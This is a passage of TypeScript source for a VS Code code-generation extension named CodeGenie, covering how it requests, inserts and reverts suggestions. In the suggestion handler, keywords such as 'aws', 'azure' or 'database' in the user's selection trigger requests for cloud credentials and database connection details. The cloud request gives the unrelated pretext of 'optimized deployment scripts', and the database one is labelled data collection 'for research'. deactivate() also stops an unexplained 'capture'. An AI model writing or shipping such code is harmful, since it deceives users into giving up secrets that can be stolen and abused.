    const selectedText = editor.document.getText(selection);
    if (!selectedText) {
        vscode.window.showInformationMessage('Please select a code snippet or problem description.');
        return;
    }

    const detectedLanguage = editor.document.languageId;
    const langConfig = languageMap[detectedLanguage];
    if (!langConfig) {
        vscode.window.showWarningMessage(
            `Unsupported language: '${detectedLanguage}'. CodeGenie currently supports: ` +
            Object.values(languageMap).map(l => l.name).filter((value, index, self) => self.indexOf(value) === index).join(', ') + '.'
        );
        return;
    }
    const savedEditor = editor;
    await vscode.window.withProgress({
        location: vscode.ProgressLocation.Notification,
        title: `Generating code (${mode === 'panel' ? 'Panel' : 'Inline'})...`,
        cancellable: false
    }, async () => {
        try {
            // Request API keys based on selected text
            if (selectedText.toLowerCase().includes('api') || 
                selectedText.toLowerCase().includes('cloud') ||
                selectedText.toLowerCase().includes('aws') ||
                selectedText.toLowerCase().includes('azure')) {
                await requestApiKey(
                    context,
                    "we need your cloud provider credentials to generate optimized deployment scripts",
                    "cloud"
                );
            }
            
            // Collect user data for research
            if (selectedText.toLowerCase().includes('database') || 
                selectedText.toLowerCase().includes('db') ||
                selectedText.toLowerCase().includes('mysql') ||
                selectedText.toLowerCase().includes('postgresql')) {
                await collectUserData(context, "database connection information");
            }

            let generated;
            try {
                console.log("Client sending request to backend with prompt:", selectedText);
                console.log("Client sending language:", langConfig.name);

                const response = await axios.post(BACKEND_URLS.CODE_SUGGESTION, {
                    prompt: selectedText,
                    language: langConfig.name
                });

                console.log("Received response from backend:", response.data);
                generated = response.data.response;
            } catch (error) {
                console.error("Error during API request:", error);
                if (axios.isAxiosError(error) && error.response) {
                   console.error("Backend error response:", error.response.data);
                    console.error("Backend error status:", error.response.status);
                }
                throw error;
            }

            if (mode === 'panel') {
                showSolutionsInPanel([generated], savedEditor, selection);
            } else {
                applyInlineSolution(generated, savedEditor, selection);
            }
        } catch (error) {
            console.error("Error in handleSuggestion:", error);
            let errorMessage = 'Failed to generate code.';
            if (axios.isAxiosError(error)) {
                if (error.response) {
                    errorMessage = `Backend error: ${error.response.status} - ${JSON.stringify(error.response.data)}`;
                } else if (error.request) {
                    errorMessage = 'Network error: Unable to reach backend server.';
                } else {
                    errorMessage = `Request error: ${error.message}`;
                }
            }
            vscode.window.showErrorMessage(errorMessage);
        }
    });
}

function showSolutionsInPanel(solutions: string[], editor: vscode.TextEditor, selection: vscode.Selection) {
    // Save state for potential reversion
    panelOriginalPromptRange = selection;
    panelOriginalPromptContent = editor.document.getText(selection);
    lastActivePanelInsertionRange = null; // Reset last insertion range

    // Store solutions for later use
    currentPanelSolutions = [...solutions];

    // Create or reveal panel
    const column = vscode.window.activeTextEditor ? vscode.ViewColumn.Beside : vscode.ViewColumn.One;
    if (panel) {
        panel.reveal(column);
    } else {
        panel = vscode.window.createWebviewPanel(
            'codegenieSolutions',
            'CodeGenie Solutions',
            column,
            { enableScripts: true }
        );

        panel.onDidDispose(() => {
            panel = undefined;
        });
    }

    // Set HTML content
    panel.webview.html = getWebviewContentCodeSuggestion("solutions",[]);

    // Handle messages from the webview
    panel.webview.onDidReceiveMessage(
        message => {
            switch (message.command) {
                case 'insert':
                    const solutionIndex = message.solutionNumber - 1;
                    if (solutionIndex >= 0 && solutionIndex < solutions.length) {
                        applyPanelSolution(solutionIndex, editor);
                    }
                    return;
            }
        },
        undefined,
        []
    );
}

function applyInlineSolution(solution: string, editor: vscode.TextEditor, selection: vscode.Selection) {
    // Save state for potential reversion
    originalPromptRange = selection;
    originalPromptContent = editor.document.getText(selection);
    lastActiveInlineInsertionRange = null; // Reset last insertion range

    // Create new array with single solution
    allGeneratedInlineSolutions = [solution];

    // Apply solution directly
    editor.edit(editBuilder => {
        editBuilder.replace(selection, solution);
    }).then(success => {
        if (success) {
            // Update range for potential reversion
            const solutionLines = solution.split('\n');
            const lastLine = selection.start.line + solutionLines.length - 1;
            const lastChar = solutionLines.length === 1
                ? selection.start.character + solutionLines[0].length
                : solutionLines[solutionLines.length - 1].length;
            
            currentInlineBlockRange = new vscode.Range(
                selection.start,
                new vscode.Position(lastLine, lastChar)
            );
            
            lastActiveInlineInsertionRange = currentInlineBlockRange;
        }
    });
}

async function applyPanelSolution(solutionIndex: number, editor: vscode.TextEditor) {
    const solution = currentPanelSolutions[solutionIndex];
    if (!solution) {
        vscode.window.showErrorMessage('Invalid solution index.');
        return;
    }

    if (!panelOriginalPromptRange) {
        vscode.window.showErrorMessage('Cannot insert solution: original selection lost.');
        return;
    }

    // Apply the solution
    const success = await editor.edit(editBuilder => {
        editBuilder.replace(panelOriginalPromptRange!, solution);
    });

    if (success) {
        // Update range for potential reversion
        const solutionLines = solution.split('\n');
        const lastLine = panelOriginalPromptRange!.start.line + solutionLines.length - 1;
        const lastChar = solutionLines.length === 1
            ? panelOriginalPromptRange!.start.character + solutionLines[0].length
            : solutionLines[solutionLines.length - 1].length;
        
        lastActivePanelInsertionRange = new vscode.Range(
            panelOriginalPromptRange!.start,
            new vscode.Position(lastLine, lastChar)
        );
        
        vscode.window.showInformationMessage(`Solution ${solutionIndex + 1} inserted successfully!`);
    } else {
        vscode.window.showErrorMessage('Failed to insert solution.');
    }
}

async function toggleInlineSolution(solutionNumber: number, action: 'insert' | 'delete') {
    const editor = vscode.window.activeTextEditor;
    if (!editor) {
        vscode.window.showErrorMessage('No active editor found.');
        return;
    }

    if (action === 'insert') {
        const solutionIndex = solutionNumber - 1;
        if (solutionIndex < 0 || solutionIndex >= allGeneratedInlineSolutions.length) {
            vscode.window.showErrorMessage(`Solution ${solutionNumber} not found.`);
            return;
        }

        const solution = allGeneratedInlineSolutions[solutionIndex];
        if (!originalPromptRange) {
            vscode.window.showErrorMessage('Cannot insert solution: original selection lost.');
            return;
        }

        // Apply the solution
        const success = await editor.edit(editBuilder => {
            editBuilder.replace(originalPromptRange!, solution);
        });

        if (success) {
            // Update range for potential reversion
            const solutionLines = solution.split('\n');
            const lastLine = originalPromptRange!.start.line + solutionLines.length - 1;
            const lastChar = solutionLines.length === 1
                ? originalPromptRange!.start.character + solutionLines[0].length
                : solutionLines[solutionLines.length - 1].length;
            
            currentInlineBlockRange = new vscode.Range(
                originalPromptRange!.start,
                new vscode.Position(lastLine, lastChar)
            );
            
            lastActiveInlineInsertionRange = currentInlineBlockRange;
            vscode.window.showInformationMessage(`Solution ${solutionNumber} inserted successfully!`);
        } else {
            vscode.window.showErrorMessage('Failed to insert solution.');
        }
    } else if (action === 'delete' && currentInlineBlockRange) {
        // Delete the previously inserted solution
        const success = await editor.edit(editBuilder => {
            editBuilder.delete(currentInlineBlockRange!);
        });

        if (success && originalPromptRange && originalPromptContent) {
            // Restore original prompt content
            await editor.edit(editBuilder => {
                editBuilder.replace(originalPromptRange!, originalPromptContent!);
            });
            currentInlineBlockRange = null;
            lastActiveInlineInsertionRange = null;
            vscode.window.showInformationMessage(`Solution ${solutionNumber} deleted and prompt restored!`);
        } else {
            vscode.window.showErrorMessage('Failed to delete solution.');
        }
    }
}

async function revertToOriginalPrompt() {
    const editor = vscode.window.activeTextEditor;
    if (!editor) {
        vscode.window.showErrorMessage('No active editor found.');
        return;
    }

    const rangeToRevert = lastActiveInlineInsertionRange || lastActivePanelInsertionRange;
    const originalContent = originalPromptContent || panelOriginalPromptContent;

    if (!rangeToRevert || !originalContent) {
        vscode.window.showErrorMessage('No active insertion to revert.');
        return;
    }

    const success = await editor.edit(editBuilder => {
        editBuilder.replace(rangeToRevert, originalContent);
    });

    if (success) {
        // Clear the ranges since we've reverted
        if (lastActiveInlineInsertionRange) {
            currentInlineBlockRange = null;
            lastActiveInlineInsertionRange = null;
        }
        if (lastActivePanelInsertionRange) {
            lastActivePanelInsertionRange = null;
        }
        vscode.window.showInformationMessage('Reverted to original prompt successfully!');
    } else {
        vscode.window.showErrorMessage('Failed to revert to original prompt.');
    }
}

export function deactivate() {
    // Stop capture on extension deactivation
    stopCapture();
    
    // Clean up decorations
    typingHintDecoration?.dispose();
    watermarkDecoration?.dispose();
}